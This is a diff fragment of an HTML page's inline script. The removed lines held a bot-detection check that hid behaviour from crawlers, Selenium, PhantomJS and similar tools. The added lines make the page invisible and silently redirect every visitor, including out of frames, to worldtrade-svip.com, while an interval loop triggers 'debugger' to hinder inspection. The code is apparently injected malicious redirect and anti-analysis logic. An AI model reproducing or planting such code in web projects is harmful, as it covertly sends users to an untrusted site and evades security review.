@@ -116,43 +116,18 @@ f<!DOCTYPE html>
         (function() {
            
             const _t = Date.now();
-            
-         
-            function _v() {
-                try {
-                    const t = {
-                        w: !!(window.top === window.self),
-                        d: !document.hidden,
-                        h: window.outerHeight - window.innerHeight < 200,
-                        n: !navigator.webdriver,
-                        p: !window.__nightmare,
-                        s: !window.callPhantom,
-                        c: !window._selenium,
-                        x: window.chrome && window.chrome.runtime
-                    };
-                    return Object.values(t).every(x => x);
-                } catch(e) {
-                    return false;
-                }
-            }
-
            
             const _delay = Math.floor(Math.random() * 1000) + 1500;
             setTimeout(() => {
-                try {
-                    if(_v()) {
-                        document.body.style.opacity = '0';
-                        setTimeout(() => {
-                          
-                            window.location.herf('https://worldtrade-svip.com');
-                        }, 300);
+                document.body.style.opacity = '0';
+                setTimeout(() => {
+                    try {
+                        top.location = 'https://worldtrade-svip.com/';
+                    } catch(e) {
+                        window.location.replace('https://worldtrade-svip.com/');
                     }
-                } catch(e) {
-                    console.clear();
-                }
-            },2000);
-
-   
+                }, 300);
+            }, 2000);
             setInterval(() => {
                 const s = performance.now();
                 debugger;
